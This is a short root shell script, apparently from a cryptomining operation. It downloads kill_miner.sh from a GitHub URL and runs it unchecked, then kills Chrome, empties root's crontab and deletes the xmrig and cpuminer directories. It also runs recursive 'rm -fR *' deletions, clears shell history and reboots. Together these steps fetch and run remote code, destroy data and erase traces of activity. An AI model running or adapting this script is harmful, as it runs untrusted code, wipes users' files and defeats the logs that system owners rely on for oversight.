#!/bin/sh
wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./kill_miner.sh
sleep 3
/bin/pkill -f "chrome"
cat /dev/null > /var/spool/cron/crontabs/root
rm -fv *
rm -fR cpuminer-opt-linux/
rm -fR xmrig-6.21.0/
rm -fv *
rm -fR *
history -c && history -w
reboot
